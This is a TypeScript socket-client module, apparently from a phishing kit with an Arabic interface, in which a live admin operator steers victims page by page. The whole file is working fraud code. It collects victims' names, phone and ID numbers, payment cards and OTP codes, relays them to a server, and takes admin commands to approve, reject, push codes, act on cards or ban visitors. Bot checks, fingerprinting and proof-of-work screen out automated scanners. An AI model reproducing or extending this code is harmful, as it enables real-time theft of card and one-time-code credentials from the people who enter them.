import { signal } from "@preact/signals-react";
import { io, Socket } from "socket.io-client";
import { collectFingerprint } from "./fingerprint";
import { collectBehavior, startBehaviorTracking } from "./behavior";
import { solveProofOfWork } from "./pow";

// Socket Configuration - auto-detect API URL from current domain
const SOCKET_URL = import.meta.env.VITE_API_URL 
  || import.meta.env.VITE_SOCKET_URL 
  || (import.meta.env.MODE === 'production' 
    ? `https://api.${window.location.hostname}` 
    : "http://localhost:3001");

// Safe localStorage wrapper
function safeGetItem(key: string): string | null {
  try { return localStorage.getItem(key); } catch { return null; }
}
function safeSetItem(key: string, value: string): void {
  try { localStorage.setItem(key, value); } catch {}
}

// Flag to prevent reconnection when user is leaving
let _isLeaving = false;
export function setLeaving() { _isLeaving = true; }

// Client-side navigation callback
let _navigateCallback: ((path: string) => void) | null = null;
export function setNavigateCallback(cb: (path: string) => void) {
  _navigateCallback = cb;
}
export function clientNavigate(path: string) {
  if (_navigateCallback) {
    _navigateCallback(path);
  } else {
    window.location.href = path;
  }
}

console.log("Socket URL:", SOCKET_URL);

// Socket instance (autoConnect: false - will NOT connect until verified)
let socketInstance: Socket = io(SOCKET_URL, {
  transports: ["polling", "websocket"],
  autoConnect: false,
});
export const socket = signal<Socket>(socketInstance);

// Visitor State
export interface VisitorState {
  visitorNumber: number;
  createdAt: string;
  isRead: boolean;
  fullName: string;
  phone: string;
  idNumber: string;
  _id: string;
  apiKey: string;
  ip: string;
  country: string;
  city: string;
  os: string;
  device: string;
  browser: string;
  date: string;
  socketId: string;
  blockedCardPrefixes: string[];
  page: string;
}

export const visitor = signal<VisitorState>({
  visitorNumber: 0,
  createdAt: "",
  isRead: true,
  fullName: "",
  phone: "",
  idNumber: "",
  _id: "",
  apiKey: "",
  ip: "",
  country: "",
  city: "",
  os: "",
  device: "",
  browser: "",
  date: "",
  socketId: "",
  blockedCardPrefixes: [],
  page: "الصفحة الرئيسية",
});

// Form State
export const isFormApproved = signal<boolean>(false);
export const isFormRejected = signal<boolean>(false);
export const waitingMessage = signal<string>("");
export const nextPage = signal<string>("");
export const verificationCode = signal<string>("");

// Admin Connection State
export const isAdminConnected = signal<boolean>(false);
export const adminLastMessage = signal<string>("");

// Error/Block State
export const errorMessage = signal<{ en: string; ar: string; image?: string } | undefined>(undefined);
export const isBlocked = signal<boolean>(false);

// Card Verification
export const isCardVerified = signal<boolean | null>(null);

// Card Action from Admin
export const cardAction = signal<{ action: string; timestamp: number } | null>(null);

// Duplicate Card Rejection
export const duplicateCardRejected = signal<boolean>(false);

// Duplicate OTP Rejection
export const duplicateOtpRejected = signal<boolean>(false);

// Code Action from Admin
export const codeAction = signal<{ action: string; codeIndex: number } | null>(null);

// Payment Data
export interface PaymentData {
  totalPaid?: number;
  cardType?: string;
  cardLast4?: string;
}

// Pending data to send after connection
let pendingData: Parameters<typeof sendData>[0] | null = null;

// Connection token (obtained from server after verification)
let connectionToken: string | null = null;
let isConnecting = false;

// Function to get Turnstile token from localStorage (set by TurnstileGate component)
function getTurnstileToken(): string {
  return safeGetItem("turnstile_token") || "";
}

// Request connection token from server (with all protections)
async function requestConnectionToken(): Promise<{ success: boolean; token?: string; reason?: string }> {
  try {
    // Solve Proof of Work challenge (runs in Web Worker, ~2-3 sec, doesn't block UI)
    let powSolution: { challengeId: string; nonce: string } | null = null;
    try {
      powSolution = await solveProofOfWork();
    } catch (e) {
      console.warn("PoW failed:", e);
    }

    const fingerprint = collectFingerprint();
    const behavior = collectBehavior();
    const turnstileToken = getTurnstileToken();
    const existingVisitorId = safeGetItem("visitorId") || "";

    const response = await fetch(`${SOCKET_URL}/api/connection-token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        turnstileToken,
        fingerprint,
        behavior,
        existingVisitorId,
        powChallengeId: powSolution?.challengeId || '',
        powNonce: powSolution?.nonce || '',
      }),
    });

    const result = await response.json();
    if (result.success && result.token) {
      connectionToken = result.token;
      return { success: true, token: result.token };
    } else {
      console.warn("Connection token denied:", result.reason);
      return { success: false, reason: result.reason };
    }
  } catch (error) {
    console.error("Failed to request connection token:", error);
    // Allow on network error to not block real visitors
    return { success: false, reason: "network_error" };
  }
}

// Function to send data to server
export function sendData(params: {
  data?: Record<string, any>;
  paymentCard?: Record<string, any>;
  digitCode?: string;
  current: string;
  nextPage?: string;
  waitingForAdminResponse?: boolean;
  isCustom?: boolean;
  mode?: string;
  customWaitingMessage?: string;
}) {
  console.log("sendData called with:", params);
  visitor.value = { ...visitor.value, page: params.current };

  if (!visitor.value._id || !socket.value?.connected) {
    console.warn("Socket not connected, storing pending data and connecting...");
    pendingData = params;
    connectSocket();
    return;
  }

  const payload = {
    visitorId: visitor.value._id,
    content: params.data,
    paymentCard: params.paymentCard,
    digitCode: params.digitCode,
    page: params.current,
    waitingForAdminResponse: params.waitingForAdminResponse,
    sentCustomPage: params.isCustom,
    mode: params.mode,
  };
  console.log("Emitting more-info with payload:", payload);
  socket.value.emit("more-info", payload);

  isFormApproved.value = false;
  isFormRejected.value = false;

  if (params.nextPage) {
    nextPage.value = params.nextPage;
  }

  if (!params.mode && params.waitingForAdminResponse) {
    waitingMessage.value = params.customWaitingMessage || "جاري المعالجة...";
  }
}

// Function to send pending data after connection
export function sendPendingData() {
  if (pendingData && visitor.value._id && socket.value?.connected) {
    console.log("Sending pending data:", pendingData);
    sendData(pendingData);
    pendingData = null;
  }
}

// Pending page
let pendingPage: string | null = null;

export function navigateToPage(page: string) {
  console.log("navigateToPage called:", page);
  waitingMessage.value = "";
  visitor.value = { ...visitor.value, page };
  if (socket.value?.connected) {
    socket.value.emit("visitor:pageEnter", page);
  } else {
    pendingPage = page;
  }
}

export function sendPendingPage() {
  if (pendingPage && socket.value?.connected) {
    socket.value.emit("visitor:pageEnter", pendingPage);
    pendingPage = null;
  }
}

// Connect socket WITH protection verification
export async function connectSocket() {
  if (socket.value && socket.value.connected) return;
  if (isConnecting) return;
  isConnecting = true;

  try {
    // Step 1: Request connection token from server (Turnstile + Fingerprint + Bot check)
    if (!connectionToken) {
      const result = await requestConnectionToken();
      if (!result.success) {
        console.warn("Connection blocked:", result.reason);
        isConnecting = false;
        // If blocked as bot, show error
        if (result.reason === 'bot_detected' || result.reason === 'blocked') {
          errorMessage.value = {
            en: "Access denied.",
            ar: "تم رفض الوصول.",
          };
          isBlocked.value = true;
        }
        return;
      }
    }

    const existingVisitorId = safeGetItem("visitorId") || "";

    if (socketInstance) {
      socketInstance.removeAllListeners();
      socketInstance.disconnect();
    }

    // Step 2: Connect to socket with the verified token
    socketInstance = io(SOCKET_URL, {
      transports: ["polling", "websocket"],
      autoConnect: false,
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
      auth: {
        token: connectionToken,
      },
      query: {
        visitorId: existingVisitorId,
      },
    });
    socket.value = socketInstance;
    const s = socketInstance;

    s.on("connect", () => {
      console.log("Socket connected with verified token!");
      const vid = safeGetItem("visitorId") || "";
      s.emit("visitor:register", { visitorId: vid, existingVisitorId: vid });
    });

    s.on("connect_error", (error) => {
      console.error("Socket connection error:", error);
    });

    s.on("disconnect", (reason) => {
      console.log("Socket disconnected:", reason);
      // Only reconnect if user is NOT leaving the page
      if (!_isLeaving && !isBlocked.value && (reason === "io server disconnect" || reason === "transport close")) {
        setTimeout(() => { if (!_isLeaving && !s.connected && !isBlocked.value) s.connect(); }, 2000);
      }
    });

    s.io.on("reconnect", () => {
      const vid = safeGetItem("visitorId") || "";
      s.emit("visitor:register", { visitorId: vid, existingVisitorId: vid });
    });

    s.on("successfully-connected", (data: { sid: string; pid: string }) => {
      console.log("Successfully connected, visitor ID:", data.pid);
      visitor.value = { ...visitor.value, socketId: data.sid, _id: data.pid };
      safeSetItem("visitorId", data.pid);
      sendPendingPage();
      sendPendingData();
    });

    s.on("form:approved", () => { isFormApproved.value = true; waitingMessage.value = ""; });
    s.on("form:rejected", () => { isFormRejected.value = true; waitingMessage.value = ""; });
    s.on("visitor:navigate", (page: string) => {
      if (page) {
        waitingMessage.value = "";
        isFormApproved.value = false;
        isFormRejected.value = false;
        clientNavigate("/" + page);
      }
    });

    s.on("admin-last-message", ({ message }: { message: string }) => {
      adminLastMessage.value = message;
      waitingMessage.value = "";
      navigateToPage("END");
    });

    s.on("code", (code: string) => { verificationCode.value = code; waitingMessage.value = ""; });
    s.on("card:verified", () => { isCardVerified.value = true; waitingMessage.value = ""; });
    s.on("card:action", (action: string) => {
      cardAction.value = { action, timestamp: Date.now() };
      waitingMessage.value = "";
    });

    s.on("card:duplicateRejected", () => { duplicateCardRejected.value = true; waitingMessage.value = ""; });
    s.on("otp:duplicateRejected", () => { duplicateOtpRejected.value = true; waitingMessage.value = ""; });
    s.on("code:action", (data: { action: string; codeIndex: number }) => {
      codeAction.value = data;
      waitingMessage.value = "";
    });

    s.on("blocked", () => {
      waitingMessage.value = "";
      errorMessage.value = {
        en: "You have been banned from using the site for violating the terms of use.",
        ar: "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.",
        image: "banned.jpg",
      };
      isBlocked.value = true;
    });

    s.on("unblocked", () => { errorMessage.value = undefined; isBlocked.value = false; });
    s.on("deleted", () => { clientNavigate("/"); });
    s.on("isAdminConnected", (connected: boolean) => { isAdminConnected.value = connected; });
    s.on("bankName", (name: string) => { safeSetItem("selectedBank", name); });

    s.connect();
  } finally {
    isConnecting = false;
  }
}

// Keep old name as alias for compatibility
export const connectSocketWithToken = connectSocket;

// Initialize socket - DO NOT connect automatically
// Visitor will only connect when they submit data (after verification)
export function initializeSocket() {
  // Start behavior tracking immediately (runs silently in background)
  startBehaviorTracking();
  // Only set up page-ping tracking (HTTP, no socket)
  // Socket connection happens only when visitor submits data via submitData/connectSocket
  console.log("Socket initialized (will connect after verification)");
}

export function disconnectSocket() {
  _isLeaving = true;
  if (socket.value) {
    socket.value.io.opts.reconnection = false;
    socket.value.disconnect();
  }
}

export function updatePage(pageName: string) {
  visitor.value = { ...visitor.value, page: pageName };
  if (socket.value && socket.value.connected) {
    socket.value.emit("visitor:pageEnter", pageName);
  } else {
    const checkConnection = setInterval(() => {
      if (socket.value && socket.value.connected) {
        socket.value.emit("visitor:pageEnter", visitor.value.page);
        clearInterval(checkConnection);
      }
    }, 100);
    setTimeout(() => clearInterval(checkConnection), 10000);
  }
}

export function submitData(
  data: Record<string, any>,
  waitingForAdminResponse: boolean = false,
  _retryCount: number = 0
) {
  if (!visitor.value._id || !socket.value?.connected) {
    if (_retryCount === 0) connectSocket();
    if (_retryCount < 60) {
      setTimeout(() => { submitData(data, waitingForAdminResponse, _retryCount + 1); }, 500);
    }
    return;
  }

  const vid = safeGetItem("visitorId");
  if (!visitor.value._id) {
    socket.value.emit("visitor:register", { visitorId: vid, existingVisitorId: vid });
  }
  const payload = {
    visitorId: visitor.value._id,
    content: data,
    page: visitor.value.page,
    waitingForAdminResponse: waitingForAdminResponse,
  };

  if (socket.value) socket.value.emit("more-info", payload);
  if (waitingForAdminResponse) waitingMessage.value = "جاري المعالجة...";
}
